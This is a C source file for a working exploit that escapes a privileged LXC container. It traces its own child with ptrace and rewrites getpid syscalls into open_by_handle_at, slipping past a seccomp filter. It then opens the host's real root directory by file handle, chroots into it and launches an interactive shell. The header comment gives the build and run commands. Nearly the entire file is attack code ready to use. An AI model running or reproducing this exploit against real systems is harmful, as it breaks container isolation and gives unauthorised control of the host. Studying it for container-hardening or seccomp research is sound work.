/*
* @author Tim Newsham
* use ptrace to bypass seccomp rule against open_handle_at
* and use open_handle_at to get a handle on the REAL root dir
* and then chroot to it. This escapes privileged lxc container.
* gcc -g -Wall secopenchroot.c -o secopenchroot
* ./secopenchroot /tmp "02 00 00 00 00 00 00 00"
*
* assuming that the real root has file handle "02 00 00 00 00 00 00 00"
*/
#include <stdio.h>
#include <stdlib.h>
#include <syscall.h>
#include <errno.h>
#include <sys/signal.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <linux/kexec.h>
#include <sys/user.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#define _GNU_SOURCE
#define __USE_GNU
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
int getDat(char *p, unsigned char *buf)
{
 char *ep;
 int n, val;
 n = 0;
 while(*p) {
 
  while(isspace(*p)) p++;
 val = strtoul(p, &ep, 16);
 if(ep != p + 2)
 return -1;
 p = ep;
 buf[n++] = val;
 while(isspace(*p)) p++;
 }
 return n;
}
void attack(char *fn, char *dat)
{
 unsigned char buf[16 + MAX_HANDLE_SZ];
 struct file_handle *fp = (struct file_handle *)buf;
 int n, mfd, fd;
 fp->handle_type = 1;
 n = getDat(dat, fp->f_handle);
 if(n == -1) {
 printf("bad data!\n");
 exit(1);
 }
 fp->handle_bytes = n;
 mfd = open(fn, 0);
 if(mfd == -1) {
 perror(fn);
 exit(1);
 }
 //fd = open_by_handle_at(mfd, fp, 0);
 fd = syscall(SYS_getpid, SYS_open_by_handle_at, mfd, fp, 0);
 if(fd == -1) {
 perror("open_by_handle");
 exit(1);
 }
 printf("opened %d\n", fd);
 fchdir(fd);
 chroot(".");
 system("sh -i");
}
/* step to start or end of next system call */
int sysStep(int pid)
{
 int st;
 
 if(ptrace(PTRACE_SYSCALL, pid, NULL, NULL) == -1) {
 perror("ptrace syscall");
 return -1;
 }
 if(waitpid(pid, &st, __WALL) == -1) {
 perror("waitpid");
 return -1;
 }
 //printf("status %x\n", st);
 if(!(WIFSTOPPED(st) && WSTOPSIG(st) == SIGTRAP))
 return -1;
 return 0;
}
void dumpregs(int pid)
{
 struct user_regs_struct regs;
 if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
 return;
 printf("rip %016llx ", regs.rip);
 printf("rsp %016llx ", regs.rsp);
 printf("efl %016llx\n", regs.eflags);
 printf("rax %016llx orig %016llx ", regs.rax, regs.orig_rax);
 printf("rdi %016llx\n", regs.rdi);
 printf("rsi %016llx ", regs.rsi);
 printf("rdx %016llx ", regs.rdx);
 printf("rcx %016llx\n", regs.rcx);
 printf("r8 %016llx ", regs.r8);
 printf("r9 %016llx ", regs.r9);
 printf("r10 %016llx\n", regs.r10);
 printf("\n");
}
int main(int argc, char **argv)
{
 struct user_regs_struct regs;
 int pid;
 if(argc != 3) {
 printf("bad usage\n");
 exit(1);
 }
 switch((pid = fork())) {
 case -1: perror("fork"); exit(1);
 
 case 0: /* child: get traced and do our attack */
 ptrace(PTRACE_TRACEME, 0, NULL, NULL);
 kill(getpid(), SIGSTOP);
 attack(argv[1], argv[2]);
 exit(0);
 }
 /* parent: translate getpid calls into other syscalls. max 4 args. */
 waitpid(pid, 0, 0); /* wait for attach */
 while(sysStep(pid) != -1) {
 /* potentially tamper with syscall */
 if(ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
 perror("ptrace getregs");
 break;
 }
 /*
 * note: we wont get a syscall-enter-stop for any
 * seccomp filtered syscalls, just the syscall-exit-stop.
 */
 if(regs.rax != -ENOSYS) /* not a syscall-enter-stop ! */
 continue;
 if(regs.orig_rax == SYS_getpid) {
 regs.orig_rax = regs.rdi;
 regs.rdi = regs.rsi;
 regs.rsi = regs.rdx;
 regs.rdx = regs.r10;
 regs.r10 = regs.r8;
 regs.r8 = regs.r9;
 regs.r9 = 0;
 printf("syscallX %llu, before tampering\n", regs.orig_rax); dumpregs(pid);
 ptrace(PTRACE_SETREGS, pid, NULL, &regs);
 printf("after tampering\n");dumpregs(pid);
 }
 //printf("before\n");dumpregs(pid);
 if(sysStep(pid) == -1) /* go to syscall exit */
 break;
 //printf("after\n");dumpregs(pid);
 }
 return 0;
}
